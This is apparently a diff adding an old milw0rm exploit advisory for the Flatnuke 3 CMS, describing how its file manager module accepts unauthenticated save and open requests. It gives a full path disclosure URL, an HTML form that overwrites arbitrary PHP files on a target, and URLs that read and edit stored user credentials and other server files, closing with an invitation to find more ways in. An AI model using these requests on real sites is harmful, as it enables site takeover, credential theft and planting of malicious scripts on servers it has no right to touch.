@@ -1,0 +1,61 @@
+---------------------------------------------------------------
+ ____            __________         __             ____  __   
+/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
+ |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
+ |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
+ |___|___|  /\__|  /______  /\___  >__|            |___||__|  
+          \/\______|      \/     \/                         
+---------------------------------------------------------------
+
+Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org 
+
+---------------------------------------------------------------
+
+Flatnuke 3 Remote Command Execution / Privilege Escalation
+
+---------------------------------------------------------------
+
+#By KiNgOfThEwOrLd
+
+---------------------------------------------------------------
+Corrupted Module: File Manager
+---------------------------------------------------------------
+PoC:
+
+Flatnuke doesn't use any database, so the registred users informations 
+are located in a php file like 
+/flatnuke3/misc/fndatabase/users/username.php . By the file manager 
+module, the administrator, can upload, make, edit or delete some files, 
+only while he's logging in. By the way, making a post whit the same 
+request of that module, we can replace or edit a file, for example an 
+user profile. So, there are a lot of way to exploit this vulnerability, 
+we can edit the admin credentials, we can upload a malicious php script, 
+and much more... But to exploit this vulnerability, we need to know the 
+script path. We can get it generating a full path disclosure. 
+
+
+---------------------------------------------------------------
+Full Path Disclosure Example:
+
+http://[target]/[flatnuke3_path]/index.php?mod=[forum_path]&op=disc&argumentname=[a_casual_char]
+---------------------------------------------------------------
+File Replace Exploit:
+
+<form method="post" action="http://[target]/[flatnuke3_path]/index.php?mod=none_filemanager&amp;op="><textarea id="body" name="body" cols="90" rows="35">
+</textarea><br><input value="Save" type="submit"><input type="reset">
+<input name="opmod" value="save" type="hidden">
+<input name="ffile" value="[file_name].php" type="hidden">
+<input name="dir" value="/[script_path]/[file_path]" type="hidden"><input class="button" onclick="history.back()" value="Annulla" type="button"></form>
+---------------------------------------------------------------
+User Credential View/Edit Exploit:
+
+http://[target]/[flatnuke3_path]/index.php?mod=none_filemanager&dir=/[script_path]/[flatnuke3_path]/misc/fndatabase/users/&ffile=[username].php&opmod=open&op=
+
+Or, for example u can view and edit a file located on the server:
+
+http://[target]/[flatnuke3_path]/index.php?mod=none_filemanager&dir=/[script_path]/&ffile=[file]&opmod=open&op=
+---------------------------------------------------------------
+Do you wanna another way to exploit this vuln? Use your brain! :P
+---------------------------------------------------------------
+
+# milw0rm.com [2007-10-23]
